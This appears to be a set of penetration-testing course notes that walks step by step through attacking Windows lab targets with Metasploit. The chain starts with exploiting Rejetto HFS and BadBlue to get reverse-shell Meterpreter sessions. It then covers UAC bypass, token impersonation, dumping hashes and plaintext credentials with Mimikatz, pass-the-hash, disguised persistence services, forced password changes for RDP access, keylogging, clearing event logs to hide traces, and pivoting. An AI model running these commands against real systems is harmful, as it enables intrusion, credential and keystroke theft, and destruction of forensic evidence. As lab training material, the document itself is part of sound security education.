# Windows Post Exploitation Modules

## Overview

- **Metasploit Framework (MSF)** provides various **post-exploitation modules** for both Windows and Linux systems.
- These modules allow us to enumerate detailed information about the Windows system we've gained access to, such as:
  - **Enumerating user privileges**
  - **Identifying logged-on users**
  - **Checking if the target is a Virtual Machine (VM)**
  - **Enumerating installed programs and patches**
  - **Checking antivirus software and excluded folders**
  - **Enumerating computers connected to a domain**
  - **Enumerating shared directories**

## Demo: Windows Post Exploitation Modules

### Step-by-Step Process

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the post-exploitation process:

```bash
workspace -a windows_post
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

Perform an Nmap scan to identify services:

```bash
db_nmap -sV [targetIP]
```

Search for an **exploitation module** (e.g., Rejetto HFS):

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Show available options:

```bash
show options
```

Run the exploit to gain access:

```bash
run
```

### Interacting with Meterpreter Session

Once access is obtained, interact with the Meterpreter session:

- Retrieve system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Display Meterpreter help:

    ```bash
    help
    ```

- Attempt to escalate privileges:

    ```bash
    getsystem
    ```

- Take a screenshot of the target's desktop:

    ```bash
    screenshot
    ```

- Display mounted drives:

    ```bash
    show_mounts
    ```

- Migrate to another process (replace `2212` with the actual process ID):

    ```bash
    migrate 2212
    ```

- Check the current working directory:

    ```bash
    pwd
    ```

- Download a file from the target system:

    ```bash
    download flag.txt
    ```

Put the session in the background:

```bash
background
```

### Using Post-Exploitation Modules

#### Changing Architecture

Use the **migrate** post-exploitation module to change the architecture:

```bash
use post/windows/manage/migrate
```

Show the available options:

```bash
show options
```

#### Enumerating User Privileges

Search for a **privileges enumeration module**:

```bash
search win_privs
```

Use the **win_privs** module to enumerate the privileges of the current user:

```bash
use post/windows/gather/win_privs
```

Show options:

```bash
show options
```

Set the current session (assuming session `1`):

```bash
set SESSION 1
```

Run the module:

```bash
run
```

#### Enumerating Logged-On Users

Search for a module to enumerate logged-on users:

```bash
search enum_logged_on
```

Use the **enum_logged_on_users** module:

```bash
use post/windows/gather/enum_logged_on_users
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Checking If Target Is a Virtual Machine

Search for the **check_vm** module:

```bash
search checkvm
```

Use the **checkvm** module:

```bash
use post/windows/gather/checkvm
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Programs

Search for the **enum_applications** module:

```bash
search enum_applications
```

Use the **enum_applications** module:

```bash
use post/windows/gather/enum_applications
```

Show options and run the module:

```bash
set SESSION 1
run
```

The module will provide a list of installed programs, which can be cross-referenced to identify potential exploitation opportunities.

Check the collected information:

```bash
loot
```

#### Checking Antivirus Software and Excluded Folders

Search for the **AV enumeration** module:

```bash
search type:post platform:windows enum_av
```

Use the **enum_av_excluded** module:

```bash
use post/windows/gather/enum_av_excluded
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Computers in the Domain

Search for the **enum_computers** module:

```bash
search enum_computer
```

Use the **enum_computers** module:

```bash
use post/windows/gather/enum_computers
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Patches

Search for the **enum_patches** module:

```bash
search enum_patches
```

Use the **enum_patches** module:

```bash
use post/windows/gather/enum_patches
```

Show options and run the module:

```bash
set SESSION 1
run
```

Alternatively, gather patch information manually:

- Switch to session `1`:

    ```bash
    sessions 1
    ```

- Use the Windows shell to get system info:

    ```bash
    shell
    systeminfo
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

#### Enumerating Shares

Search for the **enum_shares** module:

```bash
search enum_shares
```

Use the **enum_shares** module:

```bash
use post/windows/gather/enum_shares
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enabling Remote Desktop (RDP)

Search for an **RDP management module**:

```bash
search rdp platform:windows
```

Use the **enable_rdp** module to enable RDP:

```bash
use post/windows/manage/enable_rdp
```

Show options and run the module:

```bash
set SESSION 1
run
```

### Conclusion

What we accomplished:
- Gained access to a Windows system via Meterpreter.
- Used various **post-exploitation modules** to gather critical information about the system, including user privileges, installed programs, AV solutions, and more.
- Managed the session to further exploit the system and establish deeper control.

# Windows Privilege Escalation: Bypassing UAC

## Bypassing UAC (User Account Control)

- **User Account Control (UAC)**: A Windows security feature introduced in **Windows Vista** to prevent unauthorized changes to the operating system.
- **Purpose of UAC**: Ensures that administrative changes to the OS require explicit approval from the user, preventing unauthorized or malicious actions.
- **Bypassing UAC**: We can use the **Windows Escalate UAC Protection Bypass (In Memory Injection)** Metasploit module. This module bypasses UAC by using the trusted publisher certificate through process injection, which spawns a second shell with UAC disabled.

## Demo: Windows Privilege Escalation: Bypassing UAC

### Step-by-Step Process

Start by checking network configuration:

```bash
ifconfig
```

Start PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the UAC bypass:

```bash
workspace -a UACBypass
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Exploitation

Perform an Nmap scan to identify open ports and services on the target:

```bash
db_nmap -sV [targetIP]
```

Search for the **Rejetto HFS exploit** module:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

### Setting the Payload

Since we want to elevate our privileges to **x64**, we need to use a 64-bit payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the network interface (replace `eth1` with your correct interface):

```bash
set LHOST eth1
```

Run the exploit to obtain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Initial Privilege Enumeration

After successfully obtaining a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Attempt to elevate privileges:

```bash
getsystem
```

Check which privileges we currently have:

```bash
getprivs
```

Verify if we are part of the **Administrators group**:

```bash
shell
```

In the shell, run the following commands:

- List users:

    ```bash
    net users
    ```

- Check if the current user is part of the **Administrators** group:

    ```bash
    net localgroup administrators
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

### Bypassing UAC

List all active sessions:

```bash
sessions
```

Search for the **bypassuac** module:

```bash
search bypassuac
```

Use the **bypassuac_injection** module:

```bash
use exploit/windows/local/bypassuac_injection
```

Set the payload for the **x64 architecture**:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the session ID of the previously obtained shell (assumed to be `1`):

```bash
set SESSION 1
```

Set the local port for the reverse connection (in this case, **4433**):

```bash
set LPORT 4433
```

Run the module:

```bash
run
```

### Selecting the Target

Set the target to **Windows x64** using tab autocompletion:

```bash
set TARGET Windows\ x64
```

Run the exploit again:

```bash
run
```

### Verifying the Second Meterpreter Session

Once the exploit completes, a second **Meterpreter session** will be created with **UAC disabled**.

Check system information in the new session:

```bash
sysinfo
```

Check the user ID to confirm administrative privileges:

```bash
getuid
```

Attempt to escalate privileges again:

```bash
getsystem
```

### Post-Exploitation

With the UAC bypassed, dump the password hashes from the target system:

```bash
hashdump
```

### Conclusion

What we accomplished:
- Used the **Rejetto HFS exploit** to gain an initial Meterpreter session on the target.
- Gathered system and privilege information.
- Used the **UAC bypass module** to create a second **Meterpreter session** with elevated privileges.
- Successfully escalated privileges, disabled UAC, and dumped the password hashes.

# Windows Privilege Escalation: Token Impersonation With Incognito

## Windows Access Tokens

- **Access Tokens**: Core element of the authentication process on Windows, created and managed by the **Local Security Authority Subsystem Service (LSASS)**.
- **Function**: A Windows access token identifies and describes the security context of a process or thread running on a system. It acts as a temporary key, similar to a web cookie, that allows users to access system or network resources without re-entering credentials.
- **Generation**: Access tokens are generated by the **winlogon.exe** process upon successful user authentication. They include the identity and privileges of the associated user account and are attached to processes like **userinit.exe**. All child processes inherit a copy of the access token from their parent process.
- **Categories of Access Tokens**:
  - **Impersonate-Level Tokens**: Created during non-interactive logins (e.g., system services, domain logons). They can be used to impersonate tokens on the local system.
  - **Delegate-Level Tokens**: Created through interactive logins (e.g., traditional logins, remote access via RDP). These tokens pose a larger threat because they can impersonate users on other systems.

## Windows Privileges

- Successful token impersonation requires certain privileges and available tokens on the target system. Key privileges include:
  - **SeAssignPrimaryToken**: Allows impersonation of tokens.
  - **SeCreateToken**: Allows creation of arbitrary tokens with administrative privileges.
  - **SeImpersonatePrivilege**: Allows creation of a process under another user's security context, often with administrative privileges.

## The Incognito Module

- **Incognito**: A built-in **Meterpreter module** originally designed as a standalone tool for impersonating user tokens post-exploitation.
- **Usage**: Incognito can list and impersonate available tokens on the target system, facilitating privilege escalation by using impersonation or delegation tokens.

## Demo: Windows Privilege Escalation: Token Impersonation with Incognito

We will demonstrate how to use **Incognito** to impersonate tokens on a target system, escalating our privileges by leveraging the **SeImpersonatePrivilege**.

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the impersonation attack:

```bash
workspace -a Impersonate
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Exploitation

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sV [targetIP]
```

Search for the **Rejetto HFS exploit**:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the payload to a 64-bit Meterpreter payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show available options:

```bash
show options
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Verifying Privileges

Once we have a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

In this case, we have **NT Authority\Local Service** privileges because we exploited a service.

List the current privileges:

```bash
getprivs
```

We observe that we have the **SeImpersonatePrivilege**, which allows us to impersonate tokens.

### Attempting Privilege Escalation

Verify that we do not have administrative privileges by attempting to dump password hashes:

```bash
hashdump
```

Navigate to the **Administrator** folder:

```bash
cd C:\\
cd Users
cd Administrators
```

### Using the Incognito Module

Load the **Incognito** module in Meterpreter:

```bash
load incognito
```

List the available user tokens:

```bash
list_tokens -u
```

### Impersonating the Administrator Token

We found an **Administrator** delegation token, so we proceed to impersonate it:

```bash
impersonate_token "ATTACKDEFENSE\Administrator"
```

Verify that the user ID has changed:

```bash
getuid
```

### Resolving the Hashdump Failure

The **hashdump** command fails because our current process still uses the access token from the **Local Service** account. To resolve this, we need to migrate to another process.

List the running processes:

```bash
ps
```

Migrate to a process with the correct privileges (replace `3544` with the actual process ID):

```bash
migrate 3544
```

### Post-Migration

Once migrated, retry the **hashdump** command:

```bash
hashdump
```

Navigate to the **Administrator** directory:

```bash
cd C:\\
cd Users
cd Administrator
```

### Conclusion

What we accomplished:
- Gained initial access using the **Rejetto HFS exploit**.
- Identified that we had the **SeImpersonatePrivilege** on the compromised system.
- Used the **Incognito module** to list available tokens and impersonate the **Administrator** token.
- Successfully migrated to a process with administrative privileges to perform post-exploitation tasks such as dumping password hashes.

# Dumping Hashes with Mimikatz

## Overview

- **Mimikatz**: A powerful Windows post-exploitation tool that allows attackers to extract plaintext credentials from memory, as well as password hashes from the local **SAM (Security Account Manager) database**.
- **SAM Database**: A file on Windows systems that stores user passwords, which can be used to authenticate users locally and remotely.
- **Kiwi Extension**: If we have access to a Meterpreter session on a Windows target, we can use the built-in **Kiwi extension**, which is an in-memory execution of Mimikatz, allowing credential dumping without touching the disk.

## Demo: Dumping Hashes With Mimikatz

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the Mimikatz attack:

```bash
workspace -a Mimikatz
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploitation

Perform an Nmap scan to identify services on the target:

```bash
db_nmap -sV [targetIP]
```

We discover that the target is running a **BadBlue web server**.

Search for the **BadBlue 2.7 exploit module**:

```bash
search badblue 2.7
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Set the appropriate target:

```bash
set target BadBlue\ EE\ 2.7\ Universal
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Using Mimikatz

Once we have a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

List the running processes to find **LSASS (Local Security Authority Subsystem Service)**, which handles security and access tokens:

```bash
ps
```

Locate the **LSASS** process by its name or process ID (replace `792` with the actual process ID of LSASS):

```bash
pgrep lsass
migrate 792
```

### Using the Kiwi (Mimikatz) Extension

Load the **Kiwi** (Mimikatz) extension in Meterpreter:

```bash
load kiwi
```

Check the available commands for Kiwi:

```bash
help
```

#### Dumping Credentials

Dump all credentials from memory using the `creds_all` command:

```bash
creds_all
```

We can only dump the credentials of users who have previously logged into the system.

#### Dumping SAM Database

Dump the contents of the **SAM database**:

```bash
lsa_dump_sam
```

Dump the secrets stored in **LSA (Local Security Authority)**:

```bash
lsa_dump_secrets
```

### Uploading and Executing Mimikatz Manually

If necessary, we can upload the **Mimikatz executable** to the target system:

```bash
upload /usr/share/windows-resources/mimikatz
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Switch to a shell session to execute Mimikatz directly:

```bash
shell
```

Run **Mimikatz** from the shell:

```bash
.\mimikatz.exe
```

### Running Mimikatz Commands

- Enable **debug privileges** in Mimikatz:

    ```bash
    privilege::debug
    ```

- List the logon passwords stored in memory (Note: You will only see users who have previously logged in):

    ```bash
    sekurlsa::logonpasswords
    ```

### Conclusion

What we accomplished:
- Gained initial access by exploiting a vulnerable **BadBlue web server**.
- Migrated to the **LSASS** process to dump credentials.
- Used the **Kiwi extension** in Meterpreter to dump credentials and SAM hashes.
- Uploaded and executed **Mimikatz** to retrieve stored credentials and hashes from the target system.

# Pass-The-Hash With PsExec

## Overview

- **Pass-the-Hash**: An exploitation technique that involves capturing or harvesting **NTLM hashes** or clear-text passwords and using them to authenticate with a target system.
- **PsExec Module**: This technique allows us to authenticate with a target system via **SMB** using legitimate credentials (hashes or passwords) instead of exploiting vulnerabilities in services.
- **Objective**: Using the **PsExec module** in Metasploit, we can authenticate as a legitimate user and gain access to the target system, bypassing the need for direct service exploitation.

## Demo: Pass-The-Hash With PsExec

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the **PsExec attack**:

```bash
workspace -a Psexec
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Search for the **BadBlue 2.7 exploit module**:

```bash
search badblue
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Set the appropriate target:

```bash
set target BadBlue\ EE\ 2.7\ Universal
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Hash Extraction

Once we have a **Meterpreter session**, gather system information:

```bash
getuid
sysinfo
```

List the running processes and locate **LSASS** (Local Security Authority Subsystem Service):

```bash
pgrep lsass
```

Migrate to the **LSASS** process (replace `788` with the actual process ID):

```bash
migrate 788
```

Verify that we have administrative privileges:

```bash
getuid
```

Dump the **NTLM hashes** from the system:

```bash
hashdump
```

Exit the Meterpreter session:

```bash
exit
```

### Using PsExec with Pass-The-Hash

Search for the **PsExec** module:

```bash
search psexec
```

Use the **PsExec** module to authenticate via SMB:

```bash
use exploit/windows/smb/psexec
```

Set the **payload** for a 64-bit Meterpreter reverse TCP connection:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

### Setting Credentials for Pass-The-Hash

Set the **SMB user** as **Administrator**:

```bash
set SMBUser Administrator
```

Set the **SMB password** as the extracted **NTLM hash** (replace `[Hash]` with the actual hash):

```bash
set SMBPass [Hash] or [Password]
```

### Running the Exploit

Run the PsExec exploit to gain a new Meterpreter session:

```bash
run
```

### Post-Exploitation

Once we have a new **Meterpreter session**, list all active sessions:

```bash
sessions
```

### Conclusion

What we accomplished:
- Used the **BadBlue exploit** to gain initial access to the target system.
- Extracted **NTLM hashes** using **Meterpreter**.
- Used the **PsExec module** in Metasploit to perform a **Pass-The-Hash** attack, gaining access to the target system via legitimate credentials.
- Successfully established a **Meterpreter session** through SMB, allowing further post-exploitation activities.

# Establishing Persistence on Windows

## Overview

- **Persistence**: Techniques used by adversaries to maintain access to compromised systems, even after restarts, credential changes, or other interruptions that might cut off their access.
- **Goal**: Gaining an initial foothold is not enough; persistence must be established to ensure long-term access to the target system.
- **Post-Exploitation Modules**: Metasploit provides various **post-exploitation persistence modules** that allow us to maintain access to the target system.

## Demo: Establishing Persistence on Windows

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the persistence setup:

```bash
workspace -a Persistence
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Exploitation

Perform an Nmap scan to identify services running on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for the **Rejetto HFS exploit module**:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Show the available options:

```bash
show options
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Establishing Persistence

Once we have a Meterpreter session, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Put the Meterpreter session in the background:

```bash
CTRL + Z
```

### Setting Up Persistence with a Service

Search for **persistence modules** specific to Windows:

```bash
search platform:windows persistence
```

Use the **persistence_service** module to establish persistence through a Windows service:

```bash
use exploit/windows/local/persistence_service
```

Set the **payload** to create a reverse TCP connection:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Optionally, specify a **SERVICE_NAME** to avoid detection (e.g., by giving the service an inconspicuous name):

```bash
set SERVICE_NAME [CustomServiceName]
```

Set the session ID (assuming `1` is the active session):

```bash
set SESSION 1
```

Run the module to establish persistence:

```bash
run
```

### Verifying the Persistence

We now configure a handler to listen for incoming connections after setting up persistence.

Set up a multi-handler to manage the persistent connection:

```bash
use multi/handler
```

Set the **payload** to handle incoming connections:

```bash
set payload windows/meterpreter/reverse_tcp
```

Set the **local host interface** (replace `eth1` with your network interface):

```bash
set LHOST eth1
```

Run the handler to listen for incoming connections:

```bash
run
```

### Effect of Persistence

Once we have installed the persistence service, it will continue to run on the target system, even after a restart. The system will automatically attempt to connect back to the handler, maintaining the Meterpreter session.

### Conclusion

What we accomplished:
- Gained initial access using the **Rejetto HFS exploit**.
- Established persistence using the **persistence_service** module to ensure long-term access.
- Configured a handler to listen for incoming connections from the persistent service, ensuring we can reconnect even after system reboots.

# Enabling RDP (Remote Desktop Protocol)

## Overview

- **RDP (Remote Desktop Protocol)**: A protocol that allows remote access to a Windows system, typically over **port 3389**.
- **Default Status**: RDP is disabled by default on Windows systems.
- **Goal**: We can utilize a **Metasploit module** to enable RDP on the target system and then use a legitimate user account with a clear-text password to access the system remotely.

## Demo: Enabling RDP

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the **RDP** attack:

```bash
workspace -a RDP
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Perform an Nmap scan to identify services running on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for the **BadBlue 2.7 exploit module**:

```bash
search badblue
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Show the available options:

```bash
show options
```

Set the appropriate target:

```bash
set target Badblue\ EE\ 2.7\ Universal
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Enabling RDP

Once we have a **Meterpreter session**, gather system information:

```bash
getuid
sysinfo
```

### Enabling RDP

Put the Meterpreter session in the background:

```bash
CTRL + Z
```

Search for the **enable_rdp** module:

```bash
search enable_rdp
```

Use the **enable_rdp** post-exploitation module to enable RDP on the target:

```bash
use post/windows/manage/enable_rdp
```

Show the available options:

```bash
show options
```

Set the session ID to enable RDP (assuming session `1`):

```bash
set SESSION 1
```

Run the module to enable RDP:

```bash
exploit
```

### Verifying RDP is Enabled

To verify that **port 3389** (RDP) is now open, run the following Nmap scan:

```bash
db_nmap -p 3389 [targetIP]
```

If **port 3389** is open, RDP is enabled. To access RDP, you will need a **legitimate user account** and the associated **clear-text password**.

### Modifying User Credentials for RDP Access

Return to the Meterpreter session:

```bash
sessions 1
```

Open a Windows shell within Meterpreter:

```bash
shell
```

List the users on the target system:

```bash
net users
```

Change the **Administrator** password (note: this is **not recommended** in real scenarios, as it could alert the system owner):

```bash
net user administrator hacker_123321
```

Exit the shell:

```bash
CTRL + C
```

### Accessing RDP

To connect to the target system via RDP, use a tool like **xfreerdp**. In a new terminal tab, run the following command (replace `[targetIP]` with the actual IP address):

```bash
xfreerdp /u:administrator /p:hacker_123321 /v:[targetIP]
```

This will open an RDP session, allowing you to remotely control the target system with the **Administrator** credentials.

### Conclusion

What we accomplished:
- Exploited a vulnerable service on the target system using the **BadBlue exploit**.
- Enabled **RDP** on the target using a **post-exploitation module** in Metasploit.
- Verified that **port 3389** (RDP) is open.
- Changed the **Administrator** password and used it to connect to the system via **RDP** using **xfreerdp**.

This demonstrates how to enable RDP access and leverage it for further remote access control of the target system

# Keylogging

## Overview

- **Keylogging**: The process of capturing or recording the keystrokes entered on a target system.
- **Usage**: Keylogging can be achieved through various methods, including hardware (e.g., USB devices) or software-based keyloggers.
- **Post-Exploitation**: Using **Meterpreter** on a compromised Windows system, we can capture keystrokes entered on the target and download them to our local system for further analysis.

## Demo: Windows Keylogging

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the **Keylogging** task:

```bash
workspace -a Keylogging
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Use the **BadBlue 2.7 exploit module** to gain initial access:

```bash
use exploit/windows/http/badblue_passthru
```

Set the target:

```bash
set target BadBlue\ EE\ 2.7\ Universal
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Keylogging

Once we have a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

### Migrating to the Explorer Process

For keylogging to work properly, it is recommended to migrate to the **explorer.exe** process, which is associated with user interactions.

List all processes and locate the **explorer.exe** process:

```bash
pgrep explorer
```

Migrate to the **explorer.exe** process (replace `2312` with the actual process ID):

```bash
migrate 2312
```

### Starting the Keylogger

Use the **keyscan_start** command to begin capturing keystrokes:

```bash
keyscan_start
```

Let the keylogger run in the background while you capture input from the user.

### Dumping Captured Keystrokes

To view the captured keystrokes, use the **keyscan_dump** command:

```bash
keyscan_dump
```

This will display all recorded keystrokes since the keylogger was started.

### Conclusion

What we accomplished:
- Gained access to a Windows system using the **BadBlue exploit**.
- Migrated to the **explorer.exe** process to capture user input.
- Successfully started a **keylogger** using Meterpreter’s **keyscan_start** feature.
- Dumped and analyzed the captured keystrokes to gain further insights into user actions.

By using Metasploit’s built-in keylogging capabilities, we were able to capture and analyze the keystrokes entered on the target system without the need for additional software.

# Clearing Windows Event Logs

- The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.
- Event logs are categorized based on the type of events they store:
  - Application logs: Stores application/program events like startups, crashes etc.
  - System logs: Stores system events like startups, reboots etc.
  - Security logs: Stores security events like password changes, authentication failures etc.
 
- Event logs can be accessed via the Event Viewer on Windows.
- The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment. 

# Clearing Windows Event Logs

## Overview

- **Event Logs**: Windows systems maintain event logs that record system, security, and application activities. These logs can provide valuable forensic evidence.
- **Goal**: During post-exploitation, it's important to **clear event logs** to remove traces of malicious activity, such as password changes or privilege escalation.
- **Privileges**: Administrative privileges are required to clear Windows event logs.

## Demo: Clearing Windows Event Logs

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for clearing event logs:

```bash
workspace -a ClearingEv
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Search for the **BadBlue 2.7 exploit module**:

```bash
search BadBlue
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Show the available options for the exploit:

```bash
show options
```

Set the appropriate target:

```bash
set target BadBlue\ EE\ 2.7\ Universal
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Clearing Event Logs

Once we have a **Meterpreter session**, gather system information:

```bash
sysinfo
```

#### Checking Privileges

Verify the current user ID:

```bash
getuid
```

**Note**: Administrative privileges are required to clear event logs. If we don't have administrative privileges, we need to escalate our privileges first.

### Changing the Administrator Password (Optional)

Open a Windows shell within Meterpreter:

```bash
shell
```

Change the Administrator password (replace `Password_123321` with your chosen password):

```bash
net user administrator Password_123321
```

This action will be recorded in the **Event Log**, providing an example of a logged event.

Exit the shell:

```bash
CTRL + C
```

### Clearing the Event Logs

Return to the **Meterpreter session**. To clear all event logs, use the following command:

```bash
clearev
```

This command will clear the **Security**, **Application**, and **System** logs on the target machine, removing traces of the password change and other logged activities.

### Verifying the Event Log Clearing

After running the `clearev` command, you can verify on the target system (if accessible) that the event logs have been cleared.

### Conclusion

What we accomplished:
- Gained access to a Windows system using the **BadBlue exploit**.
- Used administrative privileges to clear the **Event Logs** on the target system.
- Successfully removed traces of our activities, such as the password change, by clearing the logs using the **Meterpreter clearev** command.

By using Metasploit's built-in **clearev** command, we ensured that our actions were not recorded in the event logs, helping to maintain stealth on the compromised system.

# Pivoting

- Pivoting is a post exploitation technique that involves utilizng a compromised host to attack other systems on the compromised host's private internal network.
- After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.
- Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.

![grafik](https://github.com/user-attachments/assets/e78b7d6c-0315-42cd-8751-d5afaa9ed730)

# Pivoting

## Overview

- **Pivoting**: A technique used in penetration testing that allows an attacker to use a compromised system (also called a "foothold" or "victim") as a stepping stone to access other systems on the same network. This is useful when the attacker cannot directly access other machines due to network segmentation or firewall restrictions.
- **Goal**: Establish access to multiple systems in a network through a single compromised machine, enabling lateral movement.

## Demo: Pivoting

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the **pivoting** attack:

```bash
workspace -a pivoting
```

Perform an Nmap scan to identify services on **Target 1**:

```bash
db_nmap -sV [TargetIp1]
```

Search for the **Rejetto HFS exploit module**:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module** to gain access to **Target 1**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Show available options:

```bash
show options
```

Set the target IP address:

```bash
set rhosts [TargetIp1]
```

Run the exploit to gain a **Meterpreter session** on **Target 1**:

```bash
run
```

### Post-Exploitation: Setting Up Pivoting

Once we have a **Meterpreter session** on **Target 1**, gather system information:

```bash
sysinfo
```

Check the network interfaces of **Target 1** to identify the subnet:

```bash
ipconfig
```

### Adding a Route

To access the subnet of **Target 1** from Metasploit, we need to add a route. This route will allow **Metasploit** to communicate with other machines in the same subnet as **Target 1**.

Add a route to the subnet (replace `[subnet]` with the actual subnet, and adjust the subnet mask `/20` if needed):

```bash
run autoroute -s [subnet]/20
```

Put the session in the background:

```bash
CTRL + Z
```

### Managing Sessions

List active sessions:

```bash
sessions
```

Rename the first session to **victim-1** for better organization:

```bash
sessions -n victim-1 -i 1
```

List sessions again to verify:

```bash
sessions
```

### Scanning Target 2 Through Pivoting

Now that we have a route to the subnet, we can scan other systems. Let's scan **Target 2** for open ports using a **port scanner**:

Use the **TCP port scanner** auxiliary module:

```bash
use auxiliary/scanner/portscan/tcp
```

Set **Target 2's** IP address:

```bash
set rhosts [TargetIp2]
```

Set the port range to scan:

```bash
set ports 1-100
```

Run the port scan:

```bash
run
```

### Port Forwarding for Deeper Scans

If we want to perform an **Nmap scan** or exploit **Target 2** further, we can use **port forwarding**. This allows us to forward **port 80** on **Target 2** to a local port on our machine.

Return to the **Meterpreter session** on **Target 1**:

```bash
sessions 1
```

Add a **port forward** from **Target 2's port 80** to local port **1234**:

```bash
portfwd add -l 1234 -p 80 -r [TargetIp2]
```

### Scanning the Forwarded Port

Now that we have port forwarding set up, we can run an Nmap scan on the forwarded port **1234** (which corresponds to **port 80** on **Target 2**):

```bash
db_nmap -sS -sV -p 1234 localhost
```

This will provide us with the service version running on **port 80** of **Target 2**.

### Exploiting Target 2

Search for the **BadBlue exploit** to target **Target 2**:

```bash
search badblue
```

Use the **BadBlue passthru** exploit module:

```bash
use exploit/windows/http/badblue_passthru
```

Set the payload for the exploit:

```bash
set payload windows/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the IP address and port for **Target 2**:

```bash
set rhosts [TargetIp2]
set rport 80
```

Set the local port to **4433** (since **port 4444** is already in use by **Target 1**):

```bash
set lport 4433
```

Run the exploit to gain a **Meterpreter session** on **Target 2**:

```bash
run
```

### Managing Sessions

Put the new session in the background and rename it to **victim-2**:

```bash
CTRL + Z
sessions -n victim-2 -i 2
```

List all active sessions to verify:

```bash
sessions
```

Now, we can interact with **victim-2**:

```bash
sessions 2
```

### Conclusion

What we accomplished:
- Gained initial access to **Target 1** using the **Rejetto HFS exploit**.
- Set up **pivoting** by adding a route to the subnet of **Target 1**.
- Scanned **Target 2** through the pivoted network.
- Used **port forwarding** to run an Nmap scan and exploit **Target 2**.
- Successfully established **Meterpreter sessions** on both **Target 1** and **Target 2**.

This demonstrates how pivoting allows lateral movement across a network, providing access to additional systems that were initially unreachable.










